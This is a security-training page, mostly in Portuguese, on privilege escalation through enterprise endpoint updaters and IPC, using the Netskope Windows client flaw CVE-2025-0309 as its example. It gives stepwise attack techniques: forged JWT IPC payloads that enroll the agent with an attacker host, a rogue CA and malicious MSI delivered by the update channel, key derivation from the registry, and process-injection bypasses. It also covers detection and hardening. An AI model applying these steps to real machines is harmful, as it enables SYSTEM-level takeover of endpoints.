# Abusando de Auto-Updaters Empresariais e IPC Privilegiado (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de Windows local privilege escalation chains encontradas em agentes de endpoint empresariais e updaters que expõem uma superfície de IPC de baixa fricção e um fluxo de atualização privilegiado. Um exemplo representativo é o Netskope Client for Windows < R129 (CVE-2025-0309), onde um usuário com poucos privilégios pode forçar o enrollment em um servidor controlado pelo atacante e então entregar um MSI malicioso que o serviço SYSTEM instala.

Ideias-chave reutilizáveis contra produtos similares:
- Abusar do localhost IPC de um serviço privilegiado para forçar re‑enrollment ou reconfiguração para um servidor do atacante.
- Implementar os endpoints de update do vendor, entregar um rogue Trusted Root CA, e apontar o updater para um pacote malicioso “assinado”.
- Evadir verificações de signer fracas (CN allow‑lists), flags de digest opcionais, e propriedades relaxadas de MSI.
- Se o IPC for “encrypted”, derivar a key/IV a partir de identificadores da máquina legíveis globalmente armazenados no registry.
- Se o serviço restringe callers por image path/process name, injetar em um processo allow‑listed ou spawnar um suspenso e bootstrapar sua DLL via um patch mínimo de thread‑context.

---
## 1) Forçando o enrollment para um servidor do atacante via localhost IPC

Muitos agentes incluem um processo UI em user‑mode que conversa com um serviço SYSTEM via localhost TCP usando JSON.

Observado no Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft um JWT enrollment token cujas claims controlam o backend host (e.g., AddonUrl). Use alg=None para que nenhuma assinatura seja requerida.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) O serviço começa a acessar seu servidor rogue para enrollment/config, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Se a verificação do chamador for baseada em caminho/nome, origine a requisição a partir de um allow‑listed vendor binary (veja §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Uma vez que o cliente se comunique com seu servidor, implemente os endpoints esperados e direcione-o para um MSI malicioso. Sequência típica:

1) /v2/config/org/clientconfig → Retornar configuração JSON com um intervalo do updater muito curto, por exemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retorna um certificado CA em PEM. O serviço o instala no Local Machine Trusted Root store.
3) /v2/checkupdate → Fornece metadata apontando para um MSI malicioso e uma versão falsa.

Bypassando verificações comuns observadas na prática:
- Signer CN allow‑list: o serviço pode checar apenas se o Subject CN é “netSkope Inc” ou “Netskope, Inc.”. Sua CA maliciosa pode emitir um leaf com esse CN e assinar o MSI.
- CERT_DIGEST property: inclua uma propriedade MSI benigno chamada CERT_DIGEST. Não há enforcement na instalação.
- Optional digest enforcement: flag de config (por exemplo, check_msi_digest=false) desativa validação criptográfica adicional.

Resultado: o serviço SYSTEM instala seu MSI de
C:\ProgramData\Netskope\stAgent\data\*.msi
executando código arbitrário como NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

A partir do R127, Netskope envolveu o JSON de IPC em um campo encryptData que parece Base64. Reversing mostrou AES com key/IV derivado de valores do registry legíveis por qualquer usuário:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atacantes podem reproduzir a encriptação e enviar comandos encriptados válidos a partir de um usuário padrão. Dica geral: se um agente subitamente “encriptar” seu IPC, procure device IDs, product GUIDs, install IDs em HKLM como material.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Alguns serviços tentam autenticar o peer resolvendo o PID da conexão TCP e comparando o image path/name contra binários allow‑listados do vendor localizados em Program Files (por exemplo, stagentui.exe, bwansvc.exe, epdlp.exe).

Dois bypasses práticos:
- DLL injection em um processo allow‑listado (ex.: nsdiag.exe) e proxy do IPC internamente.
- Spawn de um binário allow‑listado em suspended e bootstrap da sua proxy DLL sem CreateRemoteThread (see §5) para satisfazer regras de tamper impostas pelo driver.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Produtos frequentemente incluem um minifilter/OB callbacks driver (ex.: Stadrv) para remover direitos perigosos de handles para processos protegidos:
- Process: remove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe para THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Um loader user‑mode confiável que respeita essas restrições:
1) CreateProcess de um binário do vendor com CREATE_SUSPENDED.
2) Obtenha handles que ainda são permitidos: PROCESS_VM_WRITE | PROCESS_VM_OPERATION no processo, e um handle de thread com THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou apenas THREAD_RESUME se você patchar código em um RIP conhecido).
3) Sobrescreva ntdll!NtContinue (ou outro thunk inicial garantido mapeado) com um pequeno stub que chama LoadLibraryW no caminho da sua DLL, depois retorna.
4) ResumeThread para acionar seu stub in‑process, carregando sua DLL.

Porque você nunca usou PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME em um processo já protegido (você o criou), a política do driver é satisfeita.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza uma rogue CA, assinatura de MSI malicioso, e serve os endpoints necessários: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope é um IPC client custom que cria mensagens IPC arbitrárias (opcionalmente AES‑encriptadas) e inclui a injeção por processo suspenso para originar de um binário allow‑listado.

---
## 7) Detection opportunities (blue team)
- Monitorar adições ao Local Machine Trusted Root. Sysmon + registry‑mod eventing (see SpecterOps guidance) funciona bem.
- Sinalizar execuções de MSI iniciadas pelo serviço do agente a partir de paths como C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Revisar logs do agente por hosts/tenants de enrollment inesperados, ex.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – procure por addonUrl / tenant anomalies e provisioning msg 148.
- Alertar sobre clientes IPC localhost que não sejam os binários assinados esperados, ou que se originem de árvores de processos filhas incomuns.

---
## Hardening tips for vendors
- Vincular hosts de enrollment/update a uma allow‑list estrita; rejeitar domínios não confiáveis no clientcode.
- Autenticar peers de IPC com primitives do OS (ALPC security, named‑pipe SIDs) em vez de checks por image path/name.
- Manter material secreto fora de HKLM legível por todos; se o IPC precisar ser encriptado, derivar chaves de segredos protegidos ou negociar em canais autenticados.
- Tratar o updater como superfície da supply‑chain: exigir uma cadeia completa até uma CA confiável que você controla, verificar assinaturas de pacotes contra chaves pinned, e fail closed se a validação estiver desabilitada na config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
